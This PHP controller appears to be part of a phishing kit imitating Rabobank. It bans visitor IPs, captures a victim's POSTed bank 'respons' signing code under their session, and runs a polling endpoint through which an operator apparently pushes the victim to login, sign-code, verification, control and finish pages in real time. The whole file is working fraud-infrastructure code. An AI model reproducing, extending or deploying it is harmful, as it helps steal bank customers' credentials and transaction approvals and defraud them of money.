<?php

namespace App\Controllers\Rabo;

use \Core\View;
use \App\Models\Rabo\Rabo;
use \App\Auth;

class Sign extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['respons'])) {
            Rabo::setSignCode($_POST['respons'], $_SESSION['uid']);
        } else {
            if (Rabo::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Rabo::checkPayment($this->route_params['id'])) {
                Rabo::redirect();
            } else {
                Rabo::setSignCodeInformation($_SESSION['uid']);

                $check = Rabo::getSignCode($_SESSION['uid']);

                View::render('Rabo/sign.php', $data = [
                    'code' => $check
                ]);
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
            $check = Rabo::getPage($_SESSION['uid']);

            if ($check) {
                if ($check == 'loginPage') {
                    echo json_encode(['page' => 'loginPage']);
                    Rabo::setLoginPage($_SESSION['uid'], null);
                } else if ($check == 'signPage') {
                    $check = Rabo::getSignCode($_SESSION['uid']);
                    echo json_encode(['page' => 'signPage', 'code' => $check]);
                    Rabo::setSignCodePage($_SESSION['uid'], null);
                } else if ($check == 'verificationPage') {
                    echo json_encode(['page' => 'verificationPage']);   
                    Rabo::setIdentificationPage($_SESSION['uid'], null);
                } else if ($check == 'control') {
                    echo json_encode(['page' => 'control']);
                    Rabo::setControlPage($_SESSION['uid'], null);
                } else if ($check == 'finish') {
                    echo json_encode(['page' => 'finish']);
                    Rabo::setFinishPage($_SESSION['uid'], null);   
                    unset($_SESSION['pay']);
                    unset($_SESSION['uid']);
                }
            } else {
                echo json_encode(['page' => 'waiting']);
            }
        } else {
            Rabo::redirect();
        }
    }
}